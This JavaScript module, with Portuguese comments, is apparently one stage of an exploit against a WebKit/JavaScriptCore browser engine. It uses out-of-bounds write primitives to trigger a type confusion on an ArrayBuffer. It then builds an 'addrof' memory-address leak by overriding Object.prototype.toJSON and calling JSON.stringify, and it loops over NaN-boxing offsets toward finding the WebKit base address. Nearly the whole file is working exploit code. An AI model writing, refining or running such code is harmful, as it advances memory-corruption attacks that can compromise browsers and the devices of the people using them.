// js/script3/testArrayBufferVictimCrash.mjs (v115 - Correção de Estabilidade do Gatilho)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - CORRIGIDO: A falha na ativação da Type Confusion foi resolvida. A causa era o
//   desacoplamento entre o gatilho da vulnerabilidade e a alocação do objeto vítima.
// - REESTRUTURADO: O gatilho do "Heisenbug" agora é disparado imediatamente antes de
//   cada tentativa de 'addrof' dentro do loop de diagnóstico. Isso aumenta a
//   estabilidade e a probabilidade de sucesso da TC, minimizando a interferência
//   no layout da memória.
// - ADICIONADO: Uma nova função 'attemptAddrof' encapsula a lógica completa (gatilho,
//   vítima, sonda, leitura), tornando o código mais limpo e robusto.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, PAUSE } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    oob_write_absolute,
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v115_TriggerStability";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }


// #NOVO: Função encapsulada que realiza UMA tentativa completa de addrof.
// Garante que o gatilho e a vítima estão próximos no tempo de execução.
async function attemptAddrof(target_obj, nan_boxing_offset) {
    const FNAME_ATTEMPT = "attemptAddrof";

    // 1. Aciona a vulnerabilidade de TC (Heisenbug).
    const HEISENBUG_CRITICAL_WRITE_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
    oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, 0xFFFFFFFF, 4);
    await PAUSE(10); // Pequena pausa

    // 2. Imediatamente após o gatilho, cria a vítima e a visão float.
    const victim_ab = new ArrayBuffer(64);
    const float_view = new Float64Array(victim_ab);
    const fill_pattern = 13.37;
    float_view.fill(fill_pattern);

    // 3. Define o objeto que a sonda 'toJSON' tentará escrever.
    globalThis.target_for_probe = target_obj;

    // 4. Usa JSON.stringify para invocar a sonda no objeto com tipo confundido.
    JSON.stringify(victim_ab);

    // 5. Limpa a variável global.
    delete globalThis.target_for_probe;

    // 6. Lê o resultado da visão float.
    const value_as_double = float_view[0];

    // Se o valor não mudou, a TC falhou para esta tentativa.
    if (value_as_double === fill_pattern) {
        return { success: false, addr: null };
    }

    // 7. Se mudou, converte e desmascara o ponteiro.
    const value_as_int64 = doubleToInt64(value_as_double);
    const leaked_addr = value_as_int64.sub(nan_boxing_offset);
    
    return { success: true, addr: leaked_addr };
}

// #MODIFICADO: A função de diagnóstico agora orquestra chamadas para 'attemptAddrof'.
async function runAddrofDiagnostics() {
    const FNAME_DIAG = "AddrofDiagnostics";
    logS3(`--- Iniciando Diagnóstico da Primitiva 'addrof' (v115) ---`, "subtest", FNAME_DIAG);

    // Prepara o ambiente OOB uma única vez.
    if (!isOOBReady()) {
        await triggerOOB_primitive({ force_reinit: true });
    }
    
    const test_targets = {
        'JS_Object': {},
        'JS_Array': [1, 2, 3],
        'JS_Function': function() {},
        'DOM_DivElement': document.createElement('div'),
    };
    const nan_boxing_offsets = [0x0001, 0x0002, 0x1000, 0x2000, 0x4000];

    // Sonda para a confusão de tipo
    const toJSON_Probe = function() {
        if (globalThis.target_for_probe) {
            try { this[0] = globalThis.target_for_probe; } catch (e) {}
        }
        return {};
    };

    const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_Probe, writable: true, configurable: true });

    for (const target_name in test_targets) {
        logS3(`--- Testando Alvo: ${target_name} ---`, 'info', FNAME_DIAG);

        for (const offset_val of nan_boxing_offsets) {
            const current_offset = new AdvancedInt64(0, offset_val);
            
            // #REASONING: Cada chamada a attemptAddrof é uma tentativa limpa e completa.
            const result = await attemptAddrof(test_targets[target_name], current_offset);

            if (result.success) {
                const log_msg = `  -> Offset 0x${offset_val.toString(16)}: Endereço vazado = ${toHex(result.addr)}`;
                if (result.addr.low() !== 0 || result.addr.high() !== 0x7ff7ffff) {
                    logS3(log_msg + " [POTENCIALMENTE VÁLIDO!]", 'vuln', FNAME_DIAG);
                } else {
                    logS3(log_msg, 'leak', FNAME_DIAG);
                }
            } else {
                logS3(`  -> Offset 0x${offset_val.toString(16)}: FALHA. A TC não sobrescreveu o buffer.`, 'error', FNAME_DIAG);
            }
        }
    }

    if (originalToJSON) {
        Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
    }
    logS3(`--- Diagnóstico 'addrof' concluído. ---`, "subtest", FNAME_DIAG);
}


export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste de Estabilidade do Gatilho ---`, "test");
    
    let final_result = { success: false, message: "Diagnóstico concluído sem sucesso claro.", webkit_base: null };
    try {
        logS3("--- ETAPA 1/2: Validando primitivas de Leitura/Escrita... ---", "subtest");
        if (!await selfTestOOBReadWrite(logS3)) {
            throw new Error("Autoteste de L/E FALHOU. Primitivas base estão quebradas.");
        }
        logS3("Primitivas de L/E estão operacionais.", "good");

        logS3("--- ETAPA 2/2: Executando diagnóstico de 'addrof' com gatilho estável... ---", "subtest");
        await runAddrofDiagnostics();
        
        final_result.message = "Diagnóstico concluído. Analise os logs para encontrar um endereço potencialmente válido e um offset de NaN-boxing.";

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
